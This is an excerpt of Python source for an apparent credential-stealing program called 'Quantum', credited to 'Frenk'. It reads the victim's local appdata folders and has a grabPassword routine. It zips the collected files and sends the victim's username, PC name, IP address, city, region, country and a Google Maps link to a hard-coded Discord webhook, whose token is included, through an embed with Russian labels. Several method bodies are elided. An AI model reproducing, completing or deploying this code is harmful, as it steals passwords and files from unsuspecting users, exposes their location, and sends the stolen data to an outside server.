...
class Quantum:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/920629159519219733/jkZgBJByNT53hUUsrI2tBiLh-A5sO-LzJJ_YSFGcB-U6RNyFX8yuY9P6mEh2gN4KSeRZ"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Quantum"
    ...
    def grabPassword(self):
        ...
        f.write("Made by Frenk | https://github.com/TheFrenk\n\n")
    ...
    def SendInfo(self):
        ...
        new = os.path.join(self.appdata, f'Quantum-[{os.getlogin()}].zip')
        self.zip(temp, new)
        ...
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"{n} Найдены файлы: "
        embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/920642469333438494/920643911775551518/quantum.png",
            "embeds": [
                {
                    "author": {
                        "name": "Quantum",
                        "url": "https://github.com/TheFrenk/",
                        "icon_url": "https://cdn.discordapp.com/attachments/920642469333438494/920643911775551518/quantum.png"
                    },
                    "description": f"**{os.getlogin()}** Запустил Quantum\n```fix\nPC-имя: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nГород: {city}\nРегион: {region}\nСтрана: {country}```[Google Maps локация]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/920642469333438494/920643911775551518/quantum.png"
                    },       

                    "footer": {
                      "text": "©Фрэнк#9800 https://github.com/TheFrenk"
                    }
                }
            ]
        }
